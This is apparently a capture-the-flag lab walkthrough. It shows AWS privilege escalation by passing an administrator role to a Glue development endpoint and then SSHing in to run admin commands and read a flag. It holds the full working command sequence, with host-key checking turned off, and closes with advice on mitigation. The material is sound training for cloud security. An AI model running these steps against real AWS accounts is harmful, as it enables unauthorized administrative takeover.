# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:CreateDevEndpoint

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole` and `glue:CreateDevEndpoint` permissions can create an AWS Glue development endpoint with an administrative role attached. Once the endpoint is provisioned, the attacker can SSH into the endpoint and execute AWS CLI commands with the administrative role's permissions.

AWS Glue development endpoints provide interactive environments for developing and testing ETL scripts. When created, these endpoints can be assigned an IAM role that grants permissions to the underlying compute resources. If an attacker can pass a privileged role to a Glue dev endpoint, they can SSH into the endpoint and leverage the role's permissions to perform administrative actions.

This is a classic "PassRole + Service" privilege escalation pattern, similar to PassRole with Lambda or EC2, but using AWS Glue's development endpoint feature. The attack is particularly powerful because Glue dev endpoints provide direct SSH access, allowing for interactive command execution with the passed role's credentials.

**Important Note:** Glue development endpoints only support Glue versions **0.9** and **1.0** (legacy versions). Newer Glue versions (2.0, 3.0, 4.0) are not supported for dev endpoints. This scenario uses Glue 1.0.

## The Challenge

You start as the IAM user `pl-prod-glue-001-to-admin-starting-user`. Your credentials are provided via Terraform outputs. You have two key permissions: `iam:PassRole` on the target admin role, and `glue:CreateDevEndpoint`. You do not have any direct admin permissions — attempting to call `aws iam list-users` will be denied.

Your goal is to reach full administrative access represented by the role `pl-prod-glue-001-to-admin-target-role`, which has `AdministratorAccess` attached.

## Reconnaissance

First, let's confirm who we are and what we're working with:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see `pl-prod-glue-001-to-admin-starting-user` in the ARN. Now confirm you don't have admin access:

```bash
aws iam list-users --max-items 1
# Expected: AccessDenied
```

If you have `iam:ListRoles` available as a helpful permission, you can enumerate the roles in the account to identify passable targets:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `glue-001`)].{Name:RoleName,ARN:Arn}'
```

You'll spot `pl-prod-glue-001-to-admin-target-role`. You can also check the role's attached policies to confirm it has AdministratorAccess:

```bash
aws iam list-attached-role-policies --role-name pl-prod-glue-001-to-admin-target-role
```

Now let's look at whether the Glue service is allowed to assume this role (checking the trust policy):

```bash
aws iam get-role --role-name pl-prod-glue-001-to-admin-target-role --query 'Role.AssumeRolePolicyDocument'
```

You'll see that `glue.amazonaws.com` is listed as a trusted principal — the Glue service can assume this role, and you can pass it to Glue resources.

## Exploitation

### Step 1: Generate an SSH key pair

The Glue dev endpoint accepts an SSH public key during creation so you can connect to it later. Generate a key pair locally:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/glue-key -N ""
```

This creates `/tmp/glue-key` (private) and `/tmp/glue-key.pub` (public).

### Step 2: Create the Glue dev endpoint with the admin role

This is the core of the attack. You're calling `glue:CreateDevEndpoint` and simultaneously exercising `iam:PassRole` to hand the admin role to the endpoint:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-glue-001-to-admin-target-role"
SSH_PUBLIC_KEY=$(cat /tmp/glue-key.pub)

aws glue create-dev-endpoint \
  --endpoint-name "pl-glue-001-demo-endpoint" \
  --role-arn "$ROLE_ARN" \
  --public-key "$SSH_PUBLIC_KEY" \
  --glue-version "1.0" \
  --number-of-nodes 2
```

A successful response means Glue accepted the request and is now provisioning the endpoint with the admin role assigned. The endpoint will take 5-10 minutes to reach `READY` status.

### Step 3: Wait for the endpoint to provision

Poll the endpoint status until it is `READY`:

```bash
aws glue get-dev-endpoint \
  --endpoint-name "pl-glue-001-demo-endpoint" \
  --query 'DevEndpoint.Status' \
  --output text
```

Repeat every 30 seconds. You'll see it transition from `PROVISIONING` to `READY`.

### Step 4: Retrieve the endpoint's public address

Once the endpoint is `READY`, get its public IP address:

```bash
ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
  --endpoint-name "pl-glue-001-demo-endpoint" \
  --query 'DevEndpoint.PublicAddress' \
  --output text)

echo "Endpoint address: $ENDPOINT_ADDRESS"
```

### Step 5: SSH into the endpoint and execute privileged commands

Connect to the endpoint using the private key you generated. The endpoint runs as the admin role, so any AWS CLI commands you execute there carry full administrative permissions:

```bash
SSH_OPTIONS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

ssh $SSH_OPTIONS -i /tmp/glue-key "glue@${ENDPOINT_ADDRESS}" \
  "aws iam list-users --max-items 3 --output table"
```

## Verification

Still on the endpoint (or in the same SSH session), confirm your identity:

```bash
ssh $SSH_OPTIONS -i /tmp/glue-key "glue@${ENDPOINT_ADDRESS}" \
  "aws sts get-caller-identity --output json"
```

The returned ARN should contain `pl-prod-glue-001-to-admin-target-role`, confirming that the endpoint is operating with the admin role's credentials. You now have full `AdministratorAccess` in this AWS account via the Glue dev endpoint.

## Capture the Flag

With the Glue dev endpoint running as the admin role, you can execute any AWS CLI command from within the SSH session. Retrieve the CTF flag directly from SSM Parameter Store — no additional credential setup is needed because the endpoint already holds the admin role's credentials:

```bash
SSH_OPTIONS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

ssh $SSH_OPTIONS -i /tmp/glue-key "glue@${ENDPOINT_ADDRESS}" \
  "aws ssm get-parameter --name /pathfinding-labs/flags/glue-001-to-admin --query 'Parameter.Value' --output text"
```

The `AdministratorAccess` policy attached to the target role implicitly grants `ssm:GetParameter`, so the call succeeds and returns the flag value.

## What Happened

You exploited the combination of two IAM permissions: `iam:PassRole` allowed you to nominate the admin role when creating a Glue resource, and `glue:CreateDevEndpoint` let you create a compute environment that assumed that role. By SSHing into the endpoint, you accessed an interactive shell running under the admin role's identity — effectively side-stepping any direct IAM restrictions on your own user.

In real environments this attack often surfaces when data engineering teams are granted broad Glue permissions for ETL development work. The `iam:PassRole` permission is frequently over-scoped (allowed on `*` rather than limited to specific non-privileged Glue roles), making it trivially exploitable by anyone with Glue endpoint creation rights. The mitigation is to scope `iam:PassRole` tightly with an `iam:PassedToService` condition and to ensure that roles eligible to be passed to Glue do not carry elevated permissions.
